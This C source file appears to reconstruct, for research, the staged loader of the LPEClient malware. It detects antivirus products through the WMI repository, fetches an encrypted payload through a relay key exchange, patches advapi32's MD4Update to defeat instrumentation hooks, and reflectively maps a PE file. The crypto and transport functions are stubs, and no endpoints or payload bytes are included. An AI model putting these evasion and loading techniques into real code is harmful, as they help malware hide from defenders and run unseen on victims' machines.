/* Structural reconstruction of the reported LPEClient sequence.
 * The harness supplies crypto, transport, reflective mapping and internal-symbol
 * resolution. No live endpoint, payload or syscall stub is embedded here. */
#include <stddef.h>
#include <stdint.h>
#include <string.h>
typedef struct OQS_KEM OQS_KEM;
extern OQS_KEM *OQS_KEM_new(const char *);
extern int OQS_KEM_encaps(const OQS_KEM *, unsigned char *, unsigned char *, const unsigned char *);
extern void *LoadLibraryA(const char *);
extern void *GetProcAddress(void *, const char *);
extern int HeapPageAllocator_ProtectPages(void *, size_t, unsigned long);
extern void gost28147_encrypt(const unsigned char *, size_t, unsigned char *);
extern void aes_cbc_decrypt(const unsigned char *, size_t, const unsigned char *, unsigned char *);
extern void threefish_decrypt(const unsigned char *, size_t, const unsigned char *, const unsigned char *, unsigned char *);
extern void sha256(const unsigned char *, size_t, unsigned char *);
extern size_t relay_exchange(uint32_t, const unsigned char *, size_t, unsigned char *);
extern int reflective_map(const unsigned char *, size_t, const unsigned char *, size_t);
extern size_t read_file(const char *, unsigned char *, size_t);
extern void report_security_product(const unsigned char *, size_t);

void inspect_security_products(void) {
    unsigned char repository[65536];
    size_t n = read_file("C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA", repository, sizeof(repository));
    for (size_t i = 0; i + 16 < n; ++i) {
        if (!memcmp(repository+i, "AntiVirusProduct", 16)) {
            report_security_product(repository+i, n-i);
        }
    }
}

int receive_stage(const unsigned char *profile, size_t profile_len,
                  const unsigned char random_value[1568], const unsigned char uid[32],
                  const unsigned char *syscall_stub, size_t syscall_stub_len) {
    unsigned char response[65536], public_keys[4*1568], wrapped[4*1568];
    unsigned char ciphertexts[4*1568], shared_keys[128], aes_key[32], plain[65536], tweak[32];
    if (profile_len > sizeof(wrapped)) return -1;
    gost28147_encrypt(profile, profile_len, wrapped);
    relay_exchange(0xF07D6B34, wrapped, profile_len, response);
    size_t n = relay_exchange(0xA39CF278, uid, 32, response);
    sha256(random_value, 1568, aes_key);
    aes_cbc_decrypt(response, n, aes_key, public_keys);
    OQS_KEM *kem = OQS_KEM_new("ML-KEM-1024");
    for (size_t i=0; i<4; ++i) {
        OQS_KEM_encaps(kem, ciphertexts+i*1568, shared_keys+i*32, public_keys+i*1568);
    }
    gost28147_encrypt(ciphertexts, sizeof(ciphertexts), wrapped);
    n = relay_exchange(0xEF8C0D51, wrapped, sizeof(wrapped), response);
    for (size_t i=0; i<32; ++i) tweak[i] = uid[i] ^ 0xA5;
    threefish_decrypt(response, n, shared_keys, tweak, plain);
    if (n < 4 || n > sizeof(plain)) return -1;
    uint32_t parameter_len;
    memcpy(&parameter_len, plain, 4);
    if (parameter_len > n-4 || n-4-parameter_len <= 4096) return -1;
    unsigned char *payload = plain+4+parameter_len;
    if (payload[0] != 'M' || payload[1] != 'Z') return -1;
    LoadLibraryA("jscript9.dll");
    void *md4 = GetProcAddress(LoadLibraryA("advapi32.dll"), "MD4Update");
    HeapPageAllocator_ProtectPages(md4, syscall_stub_len, 0x40);
    memcpy(md4, syscall_stub, syscall_stub_len);
    /* The original uses the patched entry to disable its instrumentation hook.
     * The report omits the bytes; the harness supplies them rather than inventing them. */
    int result = reflective_map(payload, n-4-parameter_len, plain+4, parameter_len);
    if (result) relay_exchange(0xCB790A25, uid, 32, response);
    return result;
}
